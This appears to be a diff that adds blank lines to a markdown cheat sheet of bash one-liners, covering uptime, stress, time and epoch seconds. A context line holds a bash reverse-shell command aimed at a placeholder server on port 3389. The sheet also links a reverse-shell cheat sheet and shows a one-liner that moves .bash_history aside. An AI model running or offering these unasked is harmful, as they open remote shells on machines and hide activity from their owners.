@@ -21,6 +21,7 @@ bash -i >& /dev/tcp/server_ip/3389 0>&1
 ```
 
 ## See also
+
 - https://tldp.org/LDP/abs/html/x17974.html
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/
 - https://catonmat.net/bash-one-liners-explained-part-three
@@ -50,6 +51,7 @@ $ echo $EPOCHSECONDS
 ```
 
 # uptime
+
 The three load average values are 1, 5 and 15 minutes.
 
 ```bash
@@ -58,6 +60,7 @@ $ uptime
 ```
 
 # stress
+
 Stress your system in different ways.
 
 ```bash
@@ -82,11 +85,13 @@ localhost
 ```
 
 # Move a file out of the way
+
 ```bash
 mv {,_}.bash_history
 ```
 
 # Verbose time
+
 ```
 $ /usr/bin/time -v ls /
 bin dev home lib lib64 lost+found mnt proc run snap sys usr
